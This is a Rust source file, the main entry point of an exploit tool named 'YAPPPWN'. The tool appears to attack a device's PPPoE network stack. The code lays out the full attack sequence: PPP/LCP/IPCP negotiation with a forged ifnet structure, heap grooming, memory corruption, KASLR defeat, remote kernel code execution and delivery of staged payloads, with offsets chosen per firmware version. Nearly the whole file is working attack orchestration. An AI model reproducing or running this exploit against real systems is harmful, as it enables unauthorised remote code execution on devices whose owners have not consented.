mod constants;
mod exploit;
mod parser;

use exploit::{
    build_fake_ifnet, get_offset_from_firmware, list_interfaces, print_current_state, Exploit,
    Offsets,
};
use parser::{get_args, Args};
use pnet::datalink::{self};

use std::fs::File;
use std::io::{self, Read};

pub fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer) // Return the buffer
}

fn run_exploit(
    interface_name: String,
    offsets: &Offsets,
    stage1_path: String,
    stage2_path: String,
    mem_corruption_retries: usize,
) {
    // Find interface
    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .expect("Failed to find the network interface");

    // Exploit
    let mut expl = Exploit {
        exploit_state: exploit::ExploitState::default(),
        stage1: vec![0],
        stage2: vec![0],
    };

    // Load binaries of the two payloads
    expl.stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
    expl.stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");

    // LCP Echo handler
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();

    // Stages of the exploit

    print_current_state(&expl.exploit_state);

    println!("\n[+] STAGE 0: Initialization");
    expl.capture_first_padi(&interface);
    let fake_ifnet = build_fake_ifnet(&mut expl.exploit_state);
    expl.ppp_negotiation(&interface, Some(fake_ifnet));
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] Initial Negotiations Done...");
    println!("[+] Starting Heap Grooming...");
    expl.heap_grooming(&interface);

    print_current_state(&expl.exploit_state);

    println!("\n[+] STAGE 1: Memory corruption");
    print_current_state(&expl.exploit_state);

    expl.attempt_memory_corruption(&interface, mem_corruption_retries);

    print_current_state(&expl.exploit_state);

    println!("\n[+] STAGE 2: KASLR defeat");
    expl.defeat_kaslr(offsets, &interface);

    print_current_state(&expl.exploit_state);

    println!("\n[+] STAGE 3: Remote code execution");
    expl.remote_code_exec(offsets, &interface);
    expl.exploit_state.source_mac = constants::SOURCE_MAC;
    expl.ppp_negotiation(&interface, None);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);

    print_current_state(&expl.exploit_state);

    println!("\n[+] STAGE 4: Arbitrary payload execution");
    expl.frag_and_send(&interface);

    println!("\n[+] DONE!");
    // Stop the LCP handler
    handler.stop();
}

fn main() {
    println!();
    let args: Args = get_args();
    // Just print list of interfaces and exit
    if args.list_interfaces {
        list_interfaces();
        std::process::exit(0)
    }

    println!("[+] YAPPPWN [+]");
    println!("{}", args);

    // Check if minimum reqs are there
    if args.interface.is_none()
        || args.fw.is_none()
        || args.stage_1.is_none()
        || args.stage_2.is_none()
    {
        eprintln!("Error: --interface, --fw, --stage_1, and --stage_2 must be provided.");
        std::process::exit(1);
    }

    let interface = args.interface.unwrap();
    let fw = args.fw.unwrap();
    let stage_1 = args.stage_1.unwrap();
    let stage_2 = args.stage_2.unwrap();
    let offsets = get_offset_from_firmware(fw);

    run_exploit(interface, &offsets, stage_1, stage_2, args.retries.unwrap())
}
